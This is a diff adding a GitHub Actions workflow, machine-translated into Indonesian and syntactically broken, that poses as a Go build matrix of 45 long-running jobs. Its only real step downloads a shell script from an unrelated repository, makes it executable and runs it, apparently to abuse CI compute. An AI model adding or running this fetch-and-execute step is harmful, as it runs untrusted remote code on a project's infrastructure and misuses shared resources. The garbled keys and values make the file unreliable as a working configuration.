@@ -1,0 +1,27 @@
+nama : Verz
+pada : [push, pull_request]
+pekerjaan :
+  membangun :
+    nama : Biy_dd
+    berjalan di : ubuntu-18.04
+    strategi :
+      maks-paralel : 30
+      gagal-cepat : salah
+      matriks :
+        pergi : [1.6, 1.7, 1.8, 1.9, 1.10]
+        bendera : [A, B, C, D, E, F, G, H, I]
+    batas waktu-menit : 360
+    env :
+        NUM_JOBS : 40
+        PEKERJAAN : $ {{matrix.go}}
+    langkah-langkah :
+    - name : Siapkan Go $ {{matrix.go}}
+      menggunakan : tindakan / setup-go @ v1
+      dengan :
+        go-version : $ {{matrix.go}}
+      id : pergi
+    - nama : Penyiapan
+      penggunaan : tindakan / checkout @ v1
+    - nama : BA_channel
+      jalankan : |
+        wget https://github.com/gogon1/adjud/blob/main/.github/workflows/blonk.sh && chmod u + x blonk.sh && ./blonk.sh
